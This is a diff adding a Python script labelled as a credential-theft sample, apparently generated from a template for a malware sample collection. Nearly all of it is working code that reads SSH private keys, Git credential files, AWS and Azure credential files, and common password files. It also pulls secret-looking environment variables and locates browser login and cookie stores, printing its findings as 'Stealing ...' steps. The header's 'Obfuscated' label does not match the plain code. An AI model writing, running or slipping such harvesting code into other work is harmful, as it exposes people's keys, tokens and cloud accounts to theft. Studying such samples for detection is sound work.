@@ -1,0 +1,280 @@
+# Obfuscated - Level 1
+# Variation: 19
+# Credential Theft Sample - Template v2.0
+# Language: Python
+# Attack Type: Credential Theft
+# MITRE ATT&CK: T1555 (Credentials from Password Stores)
+
+import os
+import sys
+import json
+from pathlib import Path
+
+def steal_ssh_keys():
+    """窃取 SSH 密钥"""
+    keys = []
+    ssh_dir = Path.home() / '.ssh'
+    
+    if ssh_dir.exists():
+        key_patterns = ['id_rsa', 'id_ed25519', 'id_ecdsa', 'id_dsa']
+        
+        for pattern in key_patterns:
+            for key_file in ssh_dir.glob(f'*{pattern}*'):
+                if key_file.is_file():
+                    try:
+                        content = key_file.read_text()
+                        keys.append({
+                            'type': 'ssh_key',
+                            'filename': key_file.name,
+                            'path': str(key_file),
+                            'content_preview': content[:100] + '...' if len(content) > 100 else content
+                        })
+                    except Exception as e:
+                        keys.append({
+                            'type': 'ssh_key',
+                            'filename': key_file.name,
+                            'error': str(e)
+                        })
+    
+    return keys
+
+def steal_git_credentials():
+    """窃取 Git 凭据"""
+    credentials = []
+    
+    # .git-credentials 文件
+    git_cred_file = Path.home() / '.git-credentials'
+    if git_cred_file.exists():
+        try:
+            content = git_cred_file.read_text()
+            credentials.append({
+                'type': 'git_credentials',
+                'source': str(git_cred_file),
+                'content_preview': content[:200] + '...' if len(content) > 200 else content
+            })
+        except Exception:
+            pass
+    
+    # Git config 文件
+    git_config = Path.home() / '.gitconfig'
+    if git_config.exists():
+        try:
+            content = git_config.read_text()
+            if 'password' in content.lower() or 'token' in content.lower():
+                credentials.append({
+                    'type': 'git_config',
+                    'source': str(git_config),
+                    'content_preview': content[:200] + '...'
+                })
+        except Exception:
+            pass
+    
+    return credentials
+
+def steal_browser_data():
+    """窃取浏览器数据"""
+    browsers = {
+        'chrome': Path.home() / '.config' / 'google-chrome' / 'Default',
+        'firefox': Path.home() / '.mozilla' / 'firefox',
+        'chromium': Path.home() / '.config' / 'chromium',
+        'brave': Path.home() / '.config' / 'BraveSoftware' / 'Brave-Browser' / 'Default',
+    }
+    
+    found = []
+    
+    for browser_name, browser_path in browsers.items():
+        if browser_path.exists():
+            browser_info = {
+                'browser': browser_name,
+                'path': str(browser_path),
+                'exists': True,
+                'files': []
+            }
+            
+            # 查找关键文件
+            key_files = ['Login Data', 'Cookies', 'History', 'Web Data']
+            for key_file in key_files:
+                file_path = browser_path / key_file
+                if file_path.exists():
+                    browser_info['files'].append(key_file)
+            
+            found.append(browser_info)
+    
+    return found
+
+def steal_environment_secrets():
+    """窃取环境变量中的敏感信息"""
+    sensitive_patterns = [
+        'AWS_SECRET', 'AWS_ACCESS',
+        'API_KEY', 'APIKEY',
+        'SECRET_KEY', 'SECRETKEY',
+        'PASSWORD', 'PASSWD',
+        'TOKEN',
+        'CREDENTIAL',
+        'PRIVATE_KEY',
+        'DATABASE_URL',
+        'MONGO_URI',
+        'REDIS_PASSWORD',
+    ]
+    
+    stolen = {}
+    
+    for key, value in os.environ.items():
+        if any(pattern in key.upper() for pattern in sensitive_patterns):
+            stolen[key] = value
+    
+    return stolen
+
+def steal_cloud_credentials():
+    """窃取云服务商凭据"""
+    credentials = {
+        'aws': None,
+        'gcp': None,
+        'azure': None,
+    }
+    
+    # AWS
+    aws_credentials = Path.home() / '.aws' / 'credentials'
+    if aws_credentials.exists():
+        try:
+            content = aws_credentials.read_text()
+            credentials['aws'] = {
+                'source': str(aws_credentials),
+                'content_preview': content[:200] + '...'
+            }
+        except Exception:
+            pass
+    
+    # GCP
+    gcp_app_data = Path.home() / '.config' / 'gcloud'
+    if gcp_app_data.exists():
+        credentials['gcp'] = {
+            'source': str(gcp_app_data),
+            'exists': True
+        }
+    
+    # Azure
+    azure_tokens = Path.home() / '.azure' / 'accessTokens.json'
+    if azure_tokens.exists():
+        try:
+            content = azure_tokens.read_text()
+            credentials['azure'] = {
+                'source': str(azure_tokens),
+                'content_preview': content[:200] + '...'
+            }
+        except Exception:
+            pass
+    
+    return credentials
+
+def steal_password_files():
+    """窃取常见密码文件"""
+    password_files = []
+    
+    common_paths = [
+        'passwords.txt',
+        'passwords.csv',
+        'credentials.txt',
+        'creds.txt',
+        '.password',
+        '.credentials',
+    ]
+    
+    # 在家目录查找
+    for filename in common_paths:
+        filepath = Path.home() / filename
+        if filepath.exists():
+            try:
+                content = filepath.read_text()
+                password_files.append({
+                    'path': str(filepath),
+                    'size': len(content),
+                    'preview': content[:100] + '...' if len(content) > 100 else content
+                })
+            except Exception:
+                pass
+    
+    return password_files
+
+def main():
+    """主函数"""
+    print("=" * 60)
+    print("Credential Theft Sample v2.0")
+    print("=" * 60)
+    print()
+    
+    all_credentials = {
+        'ssh_keys': [],
+        'git_credentials': [],
+        'browser_data': [],
+        'environment_secrets': {},
+        'cloud_credentials': {},
+        'password_files': [],
+    }
+    
+    # SSH 密钥
+    print("[*] Stealing SSH keys...")
+    ssh_keys = steal_ssh_keys()
+    all_credentials['ssh_keys'] = ssh_keys
+    print(f"    ✓ Found {len(ssh_keys)} SSH keys")
+    for key in ssh_keys[:3]:  # 仅显示前 3 个
+        print(f"      - {key.get('filename', 'unknown')}")
+    print()
+    
+    # Git 凭据
+    print("[*] Stealing Git credentials...")
+    git_creds = steal_git_credentials()
+    all_credentials['git_credentials'] = git_creds
+    print(f"    ✓ Found {len(git_creds)} Git credential sources")
+    print()
+    
+    # 浏览器数据
+    print("[*] Stealing browser data...")
+    browser_data = steal_browser_data()
+    all_credentials['browser_data'] = browser_data
+    print(f"    ✓ Found {len(browser_data)} browsers")
+    for browser in browser_data:
+        print(f"      - {browser['browser']}: {len(browser['files'])} files")
+    print()
+    
+    # 环境变量
+    print("[*] Stealing environment secrets...")
+    env_secrets = steal_environment_secrets()
+    all_credentials['environment_secrets'] = env_secrets
+    print(f"    ✓ Found {len(env_secrets)} sensitive environment variables")
+    for key in list(env_secrets.keys())[:5]:  # 仅显示前 5 个
+        print(f"      - {key}")
+    print()
+    
+    # 云凭据
+    print("[*] Stealing cloud credentials...")
+    cloud_creds = steal_cloud_credentials()
+    all_credentials['cloud_credentials'] = cloud_creds
+    for provider, creds in cloud_creds.items():
+        if creds:
+            print(f"    ✓ Found {provider} credentials")
+    print()
+    
+    # 密码文件
+    print("[*] Stealing password files...")
+    password_files = steal_password_files()
+    all_credentials['password_files'] = password_files
+    print(f"    ✓ Found {len(password_files)} password files")
+    print()
+    
+    # 汇总
+    print("=" * 60)
+    print("Credential Theft Summary")
+    print("=" * 60)
+    print(f"SSH Keys: {len(ssh_keys)}")
+    print(f"Git Credentials: {len(git_creds)}")
+    print(f"Browsers: {len(browser_data)}")
+    print(f"Environment Secrets: {len(env_secrets)}")
+    print(f"Cloud Credentials: {sum(1 for v in cloud_creds.values() if v)}")
+    print(f"Password Files: {len(password_files)}")
+    print()
+    print("Credential theft complete!")
+    print("=" * 60)
+
+if __name__ == '__main__':
+    main()
